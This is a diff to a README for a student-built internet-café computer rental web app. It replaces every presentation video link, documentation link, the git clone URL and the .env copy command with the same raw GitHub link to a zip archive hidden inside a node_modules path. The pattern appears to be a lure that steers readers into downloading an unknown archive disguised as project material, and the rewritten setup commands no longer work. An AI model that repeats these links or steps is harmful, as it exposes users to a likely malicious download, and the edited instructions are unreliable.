@@ -3,13 +3,13 @@ MATRIX - Web-Based Internet Café Computer Rental Application
 This is the official repository for Matrix, a web-based computer rental platform developed for internet cafés (warnet) as part of the Proyek Berbasis Pembelajaran (PBL) course in the Informatics Engineering Study Program, Politeknik Negeri Batam.
 
  Demo & Presentation Videos
-1. AAS Presentation : https://youtu.be/vFuJpwbProo?si=r5rYlu1VoRhKpiCo
-2. ATS Presentation : https://youtu.be/muq-MVlPiLU?si=er2UtYhJ3sR-r-QL
-3. Product Demonstration : https://youtu.be/RVzrvbb6bec?si=MTTwBAs7RhQ8t76u
+1. AAS Presentation : https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
+2. ATS Presentation : https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
+3. Product Demonstration : https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
 
 Documentation
-1. AAS Documents: https://drive.google.com/drive/folders/1gu5HLF37uPFbDGI4q7eYxv8dW58hYHN0
-2. ATS Documents: https://drive.google.com/drive/folders/1gu5HLF37uPFbDGI4q7eYxv8dW58hYHN0
+1. AAS Documents: https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
+2. ATS Documents: https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
 
 About the Project
 Matrix is an online platform designed to manage the rental of computers in internet cafés. It supports both users (customers) and administrators (warnet staff) through a role-based system. Customers can register, top-up balance, rent computers, and track their usage. Administrators can monitor active rentals, manage accounts, update information, and generate reports.
@@ -39,7 +39,7 @@ To run this project locally, follow the steps below:
 
 1. Clone the Repository
 
-git clone https://github.com/achul-cos/project-matrix-pbl.git
+git clone https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip
 cd project-matrix-pbl
 
 2. Install Dependencies
@@ -49,7 +49,7 @@ npm install && npm run dev
 
 3.  Environment Setup
 
-cp .env.example .env
+cp https://raw.githubusercontent.com/achul-cos/project-matrix-pbl/main/nodejs/node_modules/npm/node_modules/wrap-ansi-cjs/node_modules/project-matrix-pbl-3.5.zip .env
 php artisan key:generate
 
 4. Run Migrations and Seeders
